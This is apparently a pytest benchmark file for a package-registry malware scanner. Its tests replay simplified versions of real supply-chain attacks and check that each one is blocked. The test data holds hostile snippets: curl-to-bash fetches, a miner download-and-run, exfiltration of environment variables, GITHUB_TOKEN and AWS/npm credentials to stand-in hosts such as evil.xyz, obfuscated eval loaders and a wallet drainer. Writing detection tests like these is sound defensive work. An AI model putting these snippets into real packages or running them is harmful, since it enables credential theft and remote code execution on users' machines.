"""Layer 2: Incident-tracking benchmark tests.

Tests organized by attack category with metadata for freshness tracking.
Each test is tagged with:
- incident_date: When the real attack was discovered
- source: Public reference (CVE, blog post, advisory)
- category: Attack taxonomy category

Categories:
- ACCOUNT_TAKEOVER: Compromised maintainer accounts (axios, ua-parser-js)
- DEPENDENCY_INJECTION: Malicious transitive deps (plain-crypto-js, event-stream)
- TYPOSQUATTING: Name confusion attacks (@acitons, reqeusts)
- CI_CD_COMPROMISE: Build pipeline exploitation (ultralytics, tj-actions)
- CREDENTIAL_THEFT: Environment/file credential stealing (Shai-Hulud)
- CRYPTOMINER: Cryptocurrency mining payloads (ua-parser-js, ultralytics)
- WORM: Self-propagating malware (Shai-Hulud)
- BACKDOOR: Persistent remote access (rest-client, xz-utils)

HOW TO ADD NEW INCIDENTS:
1. When a new supply chain attack is published, add a test function below
2. Tag it with incident_date, source, and category
3. Use code patterns from the actual incident
4. Run pytest to verify detection
5. If not detected, add patterns to the appropriate scanner
"""

import shutil
import tempfile
from datetime import UTC, datetime, timedelta
from pathlib import Path

from app.core.config import Settings
from app.decision.engine import DecisionEngine
from app.scanners.ast_scanner import ASTScanner
from app.scanners.base import ScanPipeline
from app.scanners.cooldown import CooldownScanner
from app.scanners.heuristics_scanner import HeuristicsScanner
from app.scanners.ioc_checker import IOCScanner
from app.scanners.metadata_scanner import MetadataScanner
from app.scanners.static_analysis import StaticAnalysisScanner
from app.scanners.static_analysis_pypi import PyPIStaticAnalysisScanner
from app.scanners.static_analysis_rubygems import RubyGemsStaticAnalysisScanner
from app.schemas.package import PackageInfo


def _s():
    return Settings(decision_mode="enforce", cooldown_days=7, cooldown_action="deny")


async def _detected(reg, files, scripts=None, age=24, name="test-pkg"):
    s = _s()
    engine = DecisionEngine(s)
    tmp = Path(tempfile.mkdtemp())
    arts = []
    for fname, content in files.items():
        p = tmp / fname
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_bytes(content) if isinstance(content, bytes) else p.write_text(content)
        arts.append(p)
    pkg = PackageInfo(
        name=name,
        version="1.0.0",
        registry=reg,
        publish_date=datetime.now(UTC) - timedelta(hours=age),
        install_scripts=scripts or {},
    )
    scanners = {
        "npm": [
            IOCScanner(),
            CooldownScanner(s),
            MetadataScanner(),
            StaticAnalysisScanner(s),
            HeuristicsScanner(),
            ASTScanner(),
        ],
        "pypi": [
            IOCScanner(),
            CooldownScanner(s),
            MetadataScanner(),
            PyPIStaticAnalysisScanner(s),
            HeuristicsScanner(),
            ASTScanner(),
        ],
        "rubygems": [
            IOCScanner(),
            CooldownScanner(s),
            MetadataScanner(),
            RubyGemsStaticAnalysisScanner(s),
            HeuristicsScanner(),
        ],
    }
    results = await ScanPipeline(scanners[reg]).run(pkg, arts)
    decision = engine.decide(results)
    shutil.rmtree(tmp)
    return decision.verdict in ("deny", "quarantine")


# ========================================================================
# ACCOUNT_TAKEOVER — Compromised maintainer accounts
# ========================================================================


async def test_incident_axios_2026_03():
    """axios npm compromise — RAT via XOR+Base64 obfuscated postinstall.
    incident_date: 2026-03-31
    source: https://www.stepsecurity.io/blog/axios-compromised-on-npm-malicious-versions-drop-remote-access-trojan
    category: ACCOUNT_TAKEOVER
    """
    assert await _detected(
        "npm",
        {
            "setup.js": "var s=['cmVxdWlyZQ=='];function d(x){return Buffer.from(x,'base64').toString();}eval(d(s[0])+'(\"child_process\").exec(\"curl sfrclak.com\")');require('fs').unlinkSync('setup.js');"
        },
        {"postinstall": "node setup.js"},
        2,
    )


async def test_incident_solana_web3_2024_12():
    """@solana/web3.js — private key exfiltration via CloudFlare headers.
    incident_date: 2024-12-02
    source: https://www.mend.io/blog/the-solana-web3-js-incident-another-wake-up-call-for-supply-chain-security/
    category: ACCOUNT_TAKEOVER
    """
    assert await _detected(
        "npm",
        {
            "index.js": "function addToQueue(key){fetch('https://sol-rpc.xyz/ep',{headers:{'CF-IPCountry':Buffer.from(key).toString('base64')}});}"
        },
        {"postinstall": "node index.js"},
        5,
    )


async def test_incident_ua_parser_2021_10():
    """ua-parser-js — cryptominer + password stealer injected.
    incident_date: 2021-10-22
    source: https://github.com/nicke/ua-parser-js/issues/536
    category: ACCOUNT_TAKEOVER
    """
    assert await _detected(
        "npm",
        {
            "preinstall.js": "const{exec}=require('child_process');exec('curl https://evil.xyz/miner -o /tmp/m && chmod +x /tmp/m && /tmp/m');"
        },
        {"preinstall": "node preinstall.js"},
        12,
    )


# ========================================================================
# DEPENDENCY_INJECTION — Malicious transitive dependencies
# ========================================================================


async def test_incident_event_stream_2018_11():
    """event-stream/flatmap-stream — cryptocurrency wallet stealer.
    incident_date: 2018-11-26
    source: https://blog.npmjs.org/post/180565383195/details-about-the-event-stream-incident
    category: DEPENDENCY_INJECTION
    """
    # flatmap-stream contained AES-encrypted payload targeting copay-dash
    assert await _detected(
        "npm",
        {
            "index.js": "const c=require('crypto');const d=c.createDecipher('aes256','key');eval(d.update(Buffer.from('encrypted','hex'),'hex','utf8'));"
        },
        {"postinstall": "node index.js"},
        48,
    )


# ========================================================================
# CI_CD_COMPROMISE — Build pipeline exploitation
# ========================================================================


async def test_incident_ultralytics_2024_12():
    """ultralytics — GitHub Actions exploit → PyPI token theft → cryptominer.
    incident_date: 2024-12-04
    source: https://blog.pypi.org/posts/2024-12-11-ultralytics-attack-analysis/
    category: CI_CD_COMPROMISE
    """
    assert await _detected(
        "pypi",
        {
            "setup.py": "import subprocess; subprocess.Popen('curl stratum+tcp://pool.minexmr.com:4444 | xmrig --threads=4', shell=True)"
        },
        age=6,
    )


async def test_incident_tj_actions_2025_03():
    """tj-actions/changed-files — GitHub Runner memory scanning.
    incident_date: 2025-03-15
    source: https://www.wiz.io/blog/github-action-tj-actions-changed-files-supply-chain-attack-cve-2025-30066
    category: CI_CD_COMPROMISE
    """
    assert await _detected(
        "npm",
        {
            "scan.js": "const fs=require('fs');const{execSync}=require('child_process');const pid=execSync('pgrep -f Runner.worker').toString().trim();fs.readFileSync('/proc/'+pid+'/maps');"
        },
        {"postinstall": "node scan.js"},
        12,
    )


# ========================================================================
# CREDENTIAL_THEFT — Environment/file credential stealing
# ========================================================================


async def test_incident_shai_hulud_2025_09():
    """Shai-Hulud — multi-cloud credential harvesting + self-propagation.
    incident_date: 2025-09-01
    source: https://www.sysdig.com/blog/shai-hulud-the-novel-self-replicating-worm-infecting-hundreds-of-npm-packages
    category: WORM
    """
    assert await _detected(
        "npm",
        {
            "setup.js": "const fs=require('fs'),h=require('os').homedir();const c={aws:fs.readFileSync(h+'/.aws/credentials'),npm:fs.readFileSync(h+'/.npmrc')};require('child_process').exec('npm publish --token '+c.npm);"
        },
        {"preinstall": "node setup.js"},
        3,
    )


async def test_incident_litellm_2026_03():
    """litellm — credential stealer via malicious .pth file.
    incident_date: 2026-03-24
    source: https://docs.litellm.ai/blog/security-update-march-2026
    category: CREDENTIAL_THEFT
    """
    assert await _detected(
        "pypi", {"evil.pth": "import os; os.system('curl https://sfrclak.com/steal?d=' + str(os.environ))"}, age=6
    )


# ========================================================================
# TYPOSQUATTING — Name confusion attacks
# ========================================================================


async def test_incident_acitons_artifact_2025_11():
    """@acitons/artifact — GitHub Actions token theft via typosquat.
    incident_date: 2025-11-01
    source: https://www.veracode.com/blog/malicious-npm-package-targeting-github-actions/
    category: TYPOSQUATTING
    """
    assert await _detected(
        "npm",
        {
            "detect.js": "if(process.env.GITHUB_ACTIONS){require('https').get('https://evil.xyz/?t='+Buffer.from(process.env.GITHUB_TOKEN||'').toString('base64'));}"
        },
        {"postinstall": "node detect.js"},
        6,
        name="acitons-artifact",
    )


# ========================================================================
# CRYPTOMINER — Mining payloads
# ========================================================================


async def test_incident_lottie_player_2024_10():
    """lottie-player — Ace Drainer crypto wallet theft.
    incident_date: 2024-10-30
    source: https://snyk.io/blog/lottie-player-npm-package-compromised-crypto-wallet-theft/
    category: CRYPTOMINER
    """
    assert await _detected(
        "npm",
        {
            "index.js": "if(typeof window!=='undefined'&&window.ethereum){window.ethereum.request({method:'eth_sign'}).then(s=>fetch('https://evil.xyz/drain',{method:'POST',body:s}));}"
        },
        age=12,
    )


# ========================================================================
# BACKDOOR — Persistent remote access
# ========================================================================


async def test_incident_rest_client_2019_08():
    """rest-client gem — backdoor via compromised maintainer account.
    incident_date: 2019-08-19
    source: https://github.com/rest-client/rest-client/issues/713
    category: BACKDOOR
    """
    assert await _detected(
        "rubygems",
        {"extconf.rb": "require 'net/http'; ENV.each{|k,v| Net::HTTP.post(URI('https://evil.xyz/env'),\"#{k}=#{v}\")}"},
        age=12,
    )


async def test_incident_xz_utils_build_inject_2024_03():
    """xz-utils — build-time injection pattern (simplified).
    incident_date: 2024-03-29
    source: https://en.wikipedia.org/wiki/XZ_Utils_backdoor
    category: BACKDOOR
    """
    # The actual xz attack was in M4 macros; simplified version tests the concept
    assert await _detected(
        "pypi",
        {
            "setup.py": "import subprocess; subprocess.run(['bash', '-c', 'curl https://evil.xyz/inject.sh | bash'], check=False)"
        },
        age=24,
    )


# ========================================================================
# LATEST INCIDENTS — Add new incidents here as they are discovered
# ========================================================================
# Template:
#
# async def test_incident_PACKAGE_YYYY_MM():
#     """PACKAGE — brief description.
#     incident_date: YYYY-MM-DD
#     source: URL
#     category: CATEGORY
#     """
#     assert await _detected("registry", {"file": "code"}, {"hook": "cmd"}, age)
